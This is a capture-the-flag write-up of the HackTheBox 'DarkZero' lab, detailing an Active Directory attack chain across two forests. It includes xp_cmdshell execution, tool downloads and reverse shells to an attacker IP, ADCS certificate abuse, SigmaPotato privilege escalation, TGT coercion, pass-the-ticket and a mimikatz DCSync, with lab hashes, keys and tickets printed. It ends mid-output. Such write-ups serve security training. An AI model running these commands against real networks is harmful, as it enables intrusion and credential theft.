---
title: "DarkZero Writeup - HTB Hard Active Directory Box"
date: 2026-04-06
categories: [HTB, Active Directory]
tags: [mssql, linked-server, xp-cmdshell, adcs, certify, certipy, ligolo-ng, sigmapotato, runascs, rubeus, kerberos, dcsync, cross-forest-trust, tgt-delegation]
author: el_mehdi_dridi
description: "Complete writeup for the DarkZero HTB machine - A hard difficulty Active Directory box involving MSSQL linked servers, ADCS certificate abuse, cross-forest TGT delegation, and DCSync to compromise two forests."
---

# DarkZero HTB Writeup

## Overview

DarkZero is a **hard** difficulty Windows Active Directory machine on HackTheBox. It involves an assume-breach scenario with two Active Directory forests connected by a bidirectional cross-forest trust with TGT delegation enabled. The attack chain goes from MSSQL linked server abuse on `DC01.darkzero.htb` to gain a foothold on `DC02.darkzero.ext`, escalating privileges via ADCS certificate enrollment + SigmaPotato, and finally abusing the cross-forest TGT delegation to DCSync `darkzero.htb` and compromise DC01 as Administrator.

**Machine Info:**
- **IP:** 10.10.11.89
- **OS:** Windows Server 2022 (DC01) / Windows Server 2022 (DC02)
- **Difficulty:** Hard
- **Forest 1:** `darkzero.htb` (DC01)
- **Forest 2:** `darkzero.ext` (DC02 — 172.16.20.2)
- **Given credentials:** `john.w / RFulUtONCOL!`

![Darkzero writeup pic](/assets/img/posts/darkzero/darkzero.png)

---

## Recon

### Nmap Scan

```bash
nmap -p- --min-rate 10000 10.10.11.89
```

Open ports reveal a typical domain controller profile — DNS (53), Kerberos (88), LDAP (389/636), SMB (445), WinRM (5985), and notably **MSSQL on 1433**.

```
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          (Domain: darkzero.htb, Host: DC01)
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022
5985/tcp  open  wsman
```

Adding to `/etc/hosts`:

```
10.10.11.89  DC01.darkzero.htb darkzero.htb DC01
```

### Validating Initial Credentials

HackTheBox provides initial credentials for this assume-breach scenario:

```bash
netexec smb DC01.darkzero.htb -u john.w -p 'RFulUtONCOL!'
# [+] darkzero.htb\john.w:RFulUtONCOL!

netexec mssql DC01.darkzero.htb -u john.w -p 'RFulUtONCOL!'
# [+] darkzero.htb\john.w:RFulUtONCOL!

netexec winrm DC01.darkzero.htb -u john.w -p 'RFulUtONCOL!'
# [-] darkzero.htb\john.w:RFulUtONCOL!  (no WinRM)
```

`john.w` authenticates to MSSQL and SMB but not WinRM. MSSQL is the priority.

---

## Foothold — Shell as svc_sql on DC02

### MSSQL Linked Server Discovery

Connecting to MSSQL using `mssqlclient.py` from Impacket with Windows authentication:

```bash
mssqlclient.py darkzero.htb/john.w:'RFulUtONCOL!'@10.10.11.89 -windows-auth
```

```
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      
-----------------   ----------------   -----------   -----------------   
DC01                SQLNCLI            SQL Server    DC01                
DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   

Linked Server       Local Login       Is Self Mapping   Remote Login
-----------------   ---------------   ---------------   ------------
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc
```

There is a **linked server** `DC02.darkzero.ext` — a SQL Server in a different forest. The local `john.w` account maps to `dc01_sql_svc` on the remote server. Checking if that account is a sysadmin:

```
SQL (darkzero\john.w  guest@master)> EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [DC02.darkzero.ext]
1
```

`dc01_sql_svc` is a **sysadmin** on DC02. 

### xp_cmdshell via Linked Server

Switching context to the linked server and enabling `xp_cmdshell`:

```
SQL (darkzero\john.w  guest@master)> use_link [DC02.darkzero.ext]
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> enable_xp_cmdshell

SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell whoami
darkzero-ext\svc_sql
```

We have code execution as `darkzero-ext\svc_sql` on DC02. Now launching a PowerShell reverse shell:

```
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell "powershell -ec <base64_encoded_revshell>"
```

Listener on Kali:

```bash
rlwrap nc -lnvp 9001
```

```
PS C:\Windows\system32> whoami
darkzero-ext\svc_sql
PS C:\Windows\system32> hostname
DC02
PS C:\> ipconfig
   IPv4 Address: 172.16.20.2
```

DC02 is on an internal subnet (`172.16.20.0/24`) and not directly reachable from our box — we need a tunnel.

---

## Pivoting — Ligolo-ng Tunnel to DC02

Setting up a Ligolo-ng tunnel to reach `172.16.20.0/24`:

**On Kali (proxy):**
```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.20.0/24 dev ligolo

./proxy -selfcert
```

**Uploading agent to DC02:**
```powershell
PS C:\users\svc_sql> iwr http://10.10.16.3:443/agent.exe -o agent.exe
PS C:\users\svc_sql> ./agent -connect 10.10.16.3:11601 -ignore-cert
```

**On Ligolo-ng console:**
```
ligolo-ng » session
? Specify a session: 1 - darkzero-ext\svc_sql@DC02
[Agent : darkzero-ext\svc_sql@DC02] » start
```

We now have a routed tunnel to `172.16.20.0/24`.

---

## Privilege Escalation on DC02 — ADCS + SigmaPotato

### Why We Need Escalation

As `svc_sql`, our shell is running without `SeImpersonatePrivilege` — the token is restricted:

```powershell
PS C:\users\svc_sql> whoami /priv
# SeImpersonatePrivilege is NOT listed
```

The intended path is to restore the service privilege through ADCS certificate enrollment.

### Step 1 — Request User Certificate with Certify

Uploading tools:

```powershell
iwr http://10.10.16.3:443/_RunasCs.exe -o runas.exe
iwr http://10.10.16.3:443/SigmaPotato.exe -o SigmaPotato.exe
iwr http://10.10.16.3:443/Certify.exe -o Certify.exe
```

Requesting a certificate from the DC02 CA using the `User` template:

```powershell
PS C:\users\svc_sql> .\Certify.exe request /ca:DC02\darkzero-ext-DC02-CA /template:User

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : darkzero-ext\svc_sql
[*] No subject name specified, using current context as subject.

[*] Template                : User
[*] Subject                 : CN=svc_sql, CN=Users, DC=darkzero, DC=ext

[*] Certificate Authority   : DC02\darkzero-ext-DC02-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 3

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEArgXsMZcg8rTp1ts4nYWGHP4+o4w+iXHU4qtqVfn7O09EDC1w
nbnbWKblbeB1xu6zkmGCejy3WVKtJh4Qqbx4DPujnkW2+G1BzoTAKU4zy++KC5M/
JwzQ+UlXgdRV2kDUQXxxk+lT8vaZeGEyEV68PRCQjXsTc08EUgUUIipaeE589ijB
Jq9apdk6Wl7Homd8HhFD01qGnFu3exJbl/G0Ir0GMp12QZRDvZCpGSA52LupOMao
hn9+2wtRLBYWBTGQlX5sNB+4Z8QQ2MsPiDyC1wbvf9UGY36vyNO0UGPhdrlKsmRS
BMAKW5oBC5V14zLiCp+z4/e0tayvdHRqTYZVYQIDAQABAoIBAQCmPCogRQnIT2GB
SPCQKNiwIX6cpH+otAB0duKhNqbzRQjvyQhm4v/Rc7x+dYiMe8E198e4FP/gZ8XX
P6kTO2JCpK7rphTewx+1s8IMsxNvoGbyH7qYBvoo6BKbhsZsMrmPxNyKOr1ivoZk
JBS72w9eFdDAFe3CnJy37PoKmQLLIDuCrGzmDY0tncApt+VN22HXbFQx1Jq0xdQb
RwKkJTtmMBmACJ4tphK0hevgQycEuG8fsxafNdsGSHlGh6DebLVMLmV/OAWEeo/f
4hWSp/2KZZwFsKWgguklI2ur5Pd6vMvOcrDb0kSLo8jInf0hSd2+Dsfzzv4q84GZ
E1ln1DMxAoGBANiyh6n/lFpjOn95uvzZgcs6jObSonVki7NH8nl5bcrBEQZU6IWC
rIvpWZR73hSoenwV05Zt8y1d7SNV/GqPvqZKT0Ie8dnEF6bigUidqqiLauWy0BS7
oKSWoDkrmhG6vLgo+yk/xuy+8shTOehlZVYGpX8LX4SUCThSwJ47AmCfAoGBAM2V
/GVPyode45GDbBntlSryq8CCNl9EVvTNrvK9u5NdE+H3HdgBR6pfgcfC3dkyBftU
XuKWHf/A2na56fFw6V9GFQkmYVuaZhxrwSzyZfNHXDh4OReZRmB668kzeV8R7Ix4
s0ZQ3CFEnqHs4l/gFB0y2pBu93l7zn9wQpTrrYn/AoGBAIWOQx77bqvmzH8Uv7Jn
PB/NjloVKBvCRHfSuBc2R/zW0W9dlZHz3/S7dYKWdWG2FQe1TBtC2MX1RdqpfFER
FyfWVNMjz1uwCAPLRnNC+ZO3mcLIWobsvS2zyDx0KxkSRo4ac/IQZMI1Td05rk8V
b0d+ATI0CELmGmikWCMtq2FxAoGBAMld35pcTUPK7ZvZ3kiHLVSj3Rbyc89cYM/n
pzScIt50jMUIB3NLzaZTZgsEE8hp9vH18fp+j2OywkkIUNzse6mWO4R602GmGd48
rToZM0LW4r1tBH7Y4tYdkFXC1V8Jb2kn0HFPQk5TqA1yuUivcwQmi25tQnj7i4fH
rW+waIqBAoGARfTGNN5myK87ZQVY3Grco375JrePDOkJxDO3TJMfOnYgjebQewGY
5zLjaFE1kFkQPNa+O8CDD6FeVMZCYy3JF94w34c417kn7IcUQU1lb3Lddlcc+HZU
FmkRhB3X8rACmDb+osA4AgP+49TGvAUOWsMhx5XolOPTVaMPiSgLhqA=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIHKTCCBRGgAwIBAgITaQAAAAOv902v7VfFIAAAAAAAAzANBgkqhkiG9w0BAQsF
ADBOMRMwEQYKCZImiZPyLGQBGRYDZXh0MRgwFgYKCZImiZPyLGQBGRYIZGFya3pl
cm8xHTAbBgNVBAMTFGRhcmt6ZXJvLWV4dC1EQzAyLUNBMB4XDTI1MTAxMDA2Mzgz
OFoXDTI2MTAxMDA2MzgzOFowUTETMBEGCgmSJomT8ixkARkWA2V4dDEYMBYGCgmS
JomT8ixkARkWCGRhcmt6ZXJvMQ4wDAYDVQQDEwVVc2VyczEQMA4GA1UEAwwHc3Zj
X3NxbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAK4F7DGXIPK06dbb
OJ2Fhhz+PqOMPolx1OKralX5+ztPRAwtcJ2521im5W3gdcbus5Jhgno8t1lSrSYe
EKm8eAz7o55FtvhtQc6EwClOM8vviguTPycM0PlJV4HUVdpA1EF8cZPpU/L2mXhh
MhFevD0QkI17E3NPBFIFFCIqWnhOfPYowSavWqXZOlpex6JnfB4RQ9Nahpxbt3sS
W5fxtCK9BjKddkGUQ72QqRkgOdi7qTjGqIZ/ftsLUSwWFgUxkJV+bDQfuGfEENjL
D4g8gtcG73/VBmN+r8jTtFBj4Xa5SrJkUgTACluaAQuVdeMy4gqfs+P3tLWsr3R0
ak2GVWECAwEAAaOCAvswggL3MBcGCSsGAQQBgjcUAgQKHggAVQBzAGUAcjApBgNV
HSUEIjAgBgorBgEEAYI3CgMEBggrBgEFBQcDBAYIKwYBBQUHAwIwDgYDVR0PAQH/
BAQDAgWgMEQGCSqGSIb3DQEJDwQ3MDUwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
DQMEAgIAgDAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQULxXxpxC+AmCB
XkgEL1SQ70kKgFkwHwYDVR0jBBgwFoAU1Rl+LJBmS8zfG6d+AhLydWFBqowwgdAG
A1UdHwSByDCBxTCBwqCBv6CBvIaBuWxkYXA6Ly8vQ049ZGFya3plcm8tZXh0LURD
MDItQ0EsQ049REMwMixDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMs
Q049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1kYXJremVybyxEQz1leHQ/
Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERp
c3RyaWJ1dGlvblBvaW50MIHHBggrBgEFBQcBAQSBujCBtzCBtAYIKwYBBQUHMAKG
gadsZGFwOi8vL0NOPWRhcmt6ZXJvLWV4dC1EQzAyLUNBLENOPUFJQSxDTj1QdWJs
aWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9u
LERDPWRhcmt6ZXJvLERDPWV4dD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xh
c3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTAvBgNVHREEKDAmoCQGCisGAQQBgjcU
AgOgFgwUc3ZjX3NxbEBkYXJremVyby5leHQwTQYJKwYBBAGCNxkCBEAwPqA8Bgor
BgEEAYI3GQIBoC4ELFMtMS01LTIxLTE5Njk3MTU1MjUtMzE2Mzg1MTItMjU1Mjg0
NTE1Ny0xMTAzMA0GCSqGSIb3DQEBCwUAA4ICAQAJva6zMvNV3zp2cOQcfDsaFmIN
bQu4u0ebohMm4AJ7QEEh1C7teKjSaWYblkOpblo2kdaca8hy38xbmzePhIADzXMd
745/2Uhotenf4PzLk+8NTRxeNLDZ6y35ogJL5LuDLv8IiGgLy8tT2cuMvzt7J82y
O4VS773hXMnrRFdyalyHU3y1XR0MtjZSTVpsvzBmEPecxnZ5N/jRT8xsOpgq/Ayc
JS504oHqhced4GXny4/nO3QGUpzTQOV7T0xyLFh6Mqbsn61a+Z9j2TMakagNqvie
sCVb4uv1JhLjrjvOqvsi8KEEWCb741yiite1+AkucVjw2+XDHi3yFc4SiSxIxibF
FjcjyGEBVkiRawrj4IMvGetEnWpSYaXRBEyL7rz7uK0XeOH/rojeWhvqARyciOj2
lh7aj+thaobU5LEHNgOfAxthiIQv2Ltg+8NkVWxt/uFzLE2YwqQCXmrd2Mw5+6Ho
4KajUg8lUPkm+HtJLgV4jbeiacjOY3Iz91MsnIPfSozSxnOBolQEM/GMF+x/S4rS
DTUGzEP86qqilBqfkp8+iV9qcQbiSResqW+rf6qJw87lExXwSfiH/2FtInt8tn41
Jxo1MX+6pQRnCUnF48alsDqUSvSll5CWPTZ6XaXivdZDPQ74FOKlxLTrozonfCvg
Px/8CPhJP6VmBB1m9Q==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:13.7642584

```

Output confirms the certificate was issued for `svc_sql@darkzero.ext`. The output includes the PEM-encoded private key and certificate.

### Step 2 — Convert and Authenticate via Certipy

Saving the certificate as `cert.pem` on Kali and converting to PFX:

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Authenticating with the certificate (fixing clock skew first):

```bash
sudo ntpdate 172.16.20.2

certipy auth -pfx cert.pfx -dc-ip 172.16.20.2
# [*] Got hash for 'svc_sql@darkzero.ext': aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f
```

We now have the **NT hash** for `svc_sql`.

### Step 3 — Change svc_sql Password

Using the NT hash to change the password:

```bash
certipy auth -pfx cert.pfx -dc-ip 172.16.20.2
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'svc_sql@darkzero.ext'
[*]     Security Extension SID: 'S-1-5-21-1969715525-31638512-2552845157-1103'
[*] Using principal: 'svc_sql@darkzero.ext'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'svc_sql.ccache'
File 'svc_sql.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'svc_sql.ccache'
[*] Trying to retrieve NT hash for 'svc_sql'
[*] Got hash for 'svc_sql@darkzero.ext': aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f
```
```bash
changepasswd.py darkzero.ext/svc_sql@dc02.darkzero.ext -hashes :816ccb849956b531db139346751db65f -newpass "Pa@ssw0rd123"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Changing the password of darkzero.ext\svc_sql
[*] Connecting to DCE/RPC as darkzero.ext\svc_sql
[*] Password was changed successfully
```

### Step 4 — RunasCs with Service Logon for SeImpersonatePrivilege

The `Policy_Backup.inf` found on DC02 shows `svc_sql` has `SeServiceLogonRight`. Using `RunasCs` with `--logon-type 5` (service logon) restores the full token:

```powershell
./runas.exe svc_sql Pa@ssw0rd123 "whoami /priv" -l 5 -b


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

`SeImpersonatePrivilege` is now available.

### Step 5 — SigmaPotato to SYSTEM

Using `SigmaPotato` (a potato-family exploit leveraging `SeImpersonatePrivilege`) to execute as SYSTEM:

```powershell
./SigmaPotato.exe "net user Administrator Pa@ssw0rd123"
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
[+] Searching for System Token...
[+] PID: 1004 | Token: 0x720 | User: NT AUTHORITY\SYSTEM
[+] Found System Token: True
[+] Duplicating Token...
[+] New Token Handle: 988
[+] Current Command Length: 35 characters
[+] Creating Process via 'CreateProcessWithTokenW'
[+] Process Started with PID: 4020

[+] Process Output:
The command completed successfully..
```

Administrator's password on DC02 is now `Pa@ssw0rd123`.

### Step 6 — Shell as Administrator on DC02 + user.txt

```powershell
./runas.exe Administrator Pa@ssw0rd123 powershell.exe -r 10.10.16.3:9007
./runas.exe Administrator Pa@ssw0rd123 powershell.exe -r 10.10.16.3:9007

[+] Running in session 0 with process function CreateProcessWithTokenW()
[+] Using Station\Desktop: Service-0x0-29894$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 720 created in background.
```

```bash
rlwrap nc -lnvp 9007
listening on [any] 9007 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.89] 58148
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
darkzero-ext\administrator
PS C:\Windows\system32> type C:\Users\Administrator\Desktop\user.txt
type C:\Users\Administrator\Desktop\user.txt
c14d56637a9ef3e98e660187a4e59669
```

---

## Privilege Escalation to DC01 — Cross-Forest TGT Delegation

### Understanding the Trust

The `darkzero.htb` and `darkzero.ext` forests share a **bidirectional cross-forest trust** with `TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION`. This means full TGTs — not just referral tickets — can cross the forest boundary. If DC01's machine account TGT lands on DC02, we can use it to authenticate back to `darkzero.htb`.

### Step 1 — Monitor for Incoming TGTs with Rubeus

From the Administrator shell on DC02, launching Rubeus in TGT monitoring mode:

```powershell
./Rubeus.exe monitor /interval:5 /nowrap
```

### Step 2 — Coerce DC01 Authentication with SpoolSample

From a separate MSSQL session on DC01, triggering authentication to DC02 via `xp_dirtree`:

```sql
SQL (darkzero\john.w  guest@master)> xp_dirtree \\DC02.darkzero.ext\C$
```

Rubeus captures the TGT:

```
[*] 10/10/2025 7:31:37 AM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  10/9/2025 11:16:15 PM
  EndTime               :  10/10/2025 9:15:28 AM
  RenewTill             :  10/16/2025 11:15:28 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDbA/PFTzlaLQIvB23gWpQNcCpw9Ou7zylDIHa2+eQjifP8bytnfYNJZ7UQGRoQBo2/zOdS2Ee32fIfqiaUZD3f9OprjEOUXTpr38zaJRb1X2yFYTGUYoMDvKFrKSG3pr42wNz79r0DPyoSBkM5b4pq0R8bxZuRxGEGbtRbpRT8YVDH7wOa1rsj4ZjUJkfvTtLUi2VEJMf7zG+YbtOCLoLWsJlQF0/TR9o9oxKp152joRveZkblqBqtkBfu+uFgXeW9RyngjwVhig8OK3kTfzaXB9VruLyYvP8oyciIIh2TUD+MVv6V7uGrB8bDUvn7PWDrxAL7CrXujGMtCoxyXJrOqgZKNehmDDdrS8LC8M3KkYFBu2kyAMFlKLWclySlxQU9+W3fzZOYN2ZegZ3crxjDfkR2Kv5/LaE8oVSTOg3miAhjHImxmrUH1kWRD5MQ1UiTBGCyeuRr4bR55IhiHwkzbhykYr4XZ79ZfZPqdFT+f06UqQtflFV/qcilwYRRvM+F7bKCsxQRG+FVM5pskML0w+W1K1IyxLKS/bf7W8l/xXZwCDVmurRnMQVXS2u8r+ZgKMu75qyYmfylbo23sFWSzs+bAowwI0NJza3oT0nxM9U5grkBDt6rzSgCZhWxWy6UfFksy43WnxIQ92Rc7EQKmvUXLGYC8PBELtpdbX1zbN7sN3jBhHpllHR2O1VajjzEkLsDHn06ANvDeTZTZs7LO8I3ZbvVtSS9Nex4q7OBm/jFXU6LU13ao9CPDZrSJ6rUoLYYcZU9CNwmZWxM+BCJLbTNBagLo7EtslpKOJKxGKYG0+5voeBflY7KN6MK9m2Hgaex4aNQ9X0V+SXZjHV5aKMQ/KW+nbU0QRAp/0evRPhpYjVSdN5fVjWhUJn1FCyHTR5UH+vupuh8BEosHhZFr6LLcB5IGaeCZwkrHPwORfWiI0sGXaUVQsOXeD+y9CyZIsGBSBMNi/d9WKp+NsIJsozxsSv6hZEa2ug1ZsFn6QIBuCo+gIanFN1RoeFFSk3U/mFdeEylCBDqfxIlwi7rUe1rv6PhS5HK7t6oavYwktJ7oKpzczc78HR+MBb8a/XmKQlZqoSndLaY3bi8z6gPVYAtuhHxMDgxwxT8wSsDyryZz/GqdEQyVmJHvqOaA8ZLVwkK7qko5I06cRICCroyeAzU8fZTW2LWSWg4qnDk2X65Wl3/GC89C0JXa6fc1SbbXEBLQVPJvXWZe7QS6CngAktMrX+85uQgn6QVpMj4eMxAzS8cwLfypjBAwql2bext/G7eV4YDuAmiqU9z3huLmAogPpETIm4eL/VgaR5L+NCscuFtwsgN/l5USdnzIuM2PcwMCN8Lr5JkjgnfXWbcnETORqL0PCADNvZdDguxfRkUUFFn/oO3iynPi+7IewcwDAErXf5CngFsqUV+EaZf7v5km0Kemo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQg1b7B0RbJQT5lDvtxP7TKkg86wdEgOsKR9gdG4JACePOhDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMTAwNjE2MTVaphEYDzIwMjUxMDEwMTYxNTI4WqcRGA8yMDI1MTAxNzA2MTUyOFqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=


```

### Step 3 — Pass-the-Ticket (Rubeus ptt)

Injecting the captured `DC01$` TGT into the current session:

```powershell
./Rubeus.exe ptt /ticket:doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDbA/PFTzlaLQIvB23gWpQNcCpw9Ou7zylDIHa2+eQjifP8bytnfYNJZ7UQGRoQBo2/zOdS2Ee32fIfqiaUZD3f9OprjEOUXTpr38zaJRb1X2yFYTGUYoMDvKFrKSG3pr42wNz79r0DPyoSBkM5b4pq0R8bxZuRxGEGbtRbpRT8YVDH7wOa1rsj4ZjUJkfvTtLUi2VEJMf7zG+YbtOCLoLWsJlQF0/TR9o9oxKp152joRveZkblqBqtkBfu+uFgXeW9RyngjwVhig8OK3kTfzaXB9VruLyYvP8oyciIIh2TUD+MVv6V7uGrB8bDUvn7PWDrxAL7CrXujGMtCoxyXJrOqgZKNehmDDdrS8LC8M3KkYFBu2kyAMFlKLWclySlxQU9+W3fzZOYN2ZegZ3crxjDfkR2Kv5/LaE8oVSTOg3miAhjHImxmrUH1kWRD5MQ1UiTBGCyeuRr4bR55IhiHwkzbhykYr4XZ79ZfZPqdFT+f06UqQtflFV/qcilwYRRvM+F7bKCsxQRG+FVM5pskML0w+W1K1IyxLKS/bf7W8l/xXZwCDVmurRnMQVXS2u8r+ZgKMu75qyYmfylbo23sFWSzs+bAowwI0NJza3oT0nxM9U5grkBDt6rzSgCZhWxWy6UfFksy43WnxIQ92Rc7EQKmvUXLGYC8PBELtpdbX1zbN7sN3jBhHpllHR2O1VajjzEkLsDHn06ANvDeTZTZs7LO8I3ZbvVtSS9Nex4q7OBm/jFXU6LU13ao9CPDZrSJ6rUoLYYcZU9CNwmZWxM+BCJLbTNBagLo7EtslpKOJKxGKYG0+5voeBflY7KN6MK9m2Hgaex4aNQ9X0V+SXZjHV5aKMQ/KW+nbU0QRAp/0evRPhpYjVSdN5fVjWhUJn1FCyHTR5UH+vupuh8BEosHhZFr6LLcB5IGaeCZwkrHPwORfWiI0sGXaUVQsOXeD+y9CyZIsGBSBMNi/d9WKp+NsIJsozxsSv6hZEa2ug1ZsFn6QIBuCo+gIanFN1RoeFFSk3U/mFdeEylCBDqfxIlwi7rUe1rv6PhS5HK7t6oavYwktJ7oKpzczc78HR+MBb8a/XmKQlZqoSndLaY3bi8z6gPVYAtuhHxMDgxwxT8wSsDyryZz/GqdEQyVmJHvqOaA8ZLVwkK7qko5I06cRICCroyeAzU8fZTW2LWSWg4qnDk2X65Wl3/GC89C0JXa6fc1SbbXEBLQVPJvXWZe7QS6CngAktMrX+85uQgn6QVpMj4eMxAzS8cwLfypjBAwql2bext/G7eV4YDuAmiqU9z3huLmAogPpETIm4eL/VgaR5L+NCscuFtwsgN/l5USdnzIuM2PcwMCN8Lr5JkjgnfXWbcnETORqL0PCADNvZdDguxfRkUUFFn/oO3iynPi+7IewcwDAErXf5CngFsqUV+EaZf7v5km0Kemo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQg1b7B0RbJQT5lDvtxP7TKkg86wdEgOsKR9gdG4JACePOhDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMTAwNjE2MTVaphEYDzIwMjUxMDEwMTYxNTI4WqcRGA8yMDI1MTAxNzA2MTUyOFqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI= /ptt


[*] Action: Import Ticket
[+] Ticket successfully imported!

klist

Current LogonId is 0:0x145d65

Cached Tickets: (1)

#0>     Client: DC01$ @ DARKZERO.HTB
        Server: krbtgt/DARKZERO.HTB @ DARKZERO.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 10/9/2025 23:16:15 (local)
        End Time:   10/10/2025 9:15:28 (local)
        Renew Time: 10/16/2025 23:15:28 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

### Step 4 — DCSync with SafetyKatz

With the DC01$ machine account ticket in memory, running a DCSync to extract the domain Administrator hash:

```powershell
.\safetykatz "lsadump::dcsync /domain:darkzero.htb /user:Administrator" "exit" /dc:DC01.darkzero.htb
.\safetykatz "lsadump::dcsync /domain:darkzero.htb /user:Administrator" "exit" /dc:DC01.darkzero.htb

  .#####.   mimikatz 2.2.0 (x64) #19041 Nov  5 2024 21:52:02
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:darkzero.htb /user:Administrator
[DC] 'darkzero.htb' will be the domain
[DC] 'DC01.darkzero.htb' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 9/10/2025 9:42:44 AM
Object Security ID   : S-1-5-21-1152179935-589108180-1989892463-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 5917507bdf2ef2c2b0a869a1cba40726
    ntlm- 0: 5917507bdf2ef2c2b0a869a1cba40726
    ntlm- 1: 5917507bdf2ef2c2b0a869a1cba40726
    lm  - 0: 58ef66870a9927dd48b3bd9d7e03845f

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : eb8f12be2ec1b48c9b9ed472823e4e60

* Primary:Kerberos-Newer-Keys *
